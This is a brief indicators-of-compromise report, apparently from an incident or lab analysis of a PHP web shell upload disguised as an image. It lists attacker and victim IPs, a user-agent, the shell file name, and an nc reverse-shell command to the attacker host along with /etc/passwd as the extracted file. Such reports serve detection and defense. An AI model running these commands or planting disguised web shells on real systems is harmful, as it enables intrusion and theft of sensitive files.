# Indicators of Compromise (IOCs)

## Network Indicators

| Type               | Value           |
| ------------------ | --------------- |
| Attacker IP        | `117.11.88.124` |
| Victim Server IP   | `24.49.63.79`   |
| Reverse Shell Port | `8080`          |

---

## HTTP Indicators

### Attacker User-Agent

```
Mozilla/5.0 (X11; Linux x86_64; rv:109.0)
Gecko/20100101 Firefox/115.0
```

---

## Malicious Files

| Artifact          | Description                |
| ----------------- | -------------------------- |
| image.jpg.php     | Uploaded PHP web shell     |
| /reviews/uploads/ | Malicious upload directory |

---

## Commands Observed

### Reverse Shell

```
nc 117.11.88.124 8080
```

---

### Exfiltration

```
/etc/passwd
```

---

## Attack Characteristics

* PHP web shell upload
* Reverse shell connection
* Sensitive file extraction
* Unauthorized outbound communication

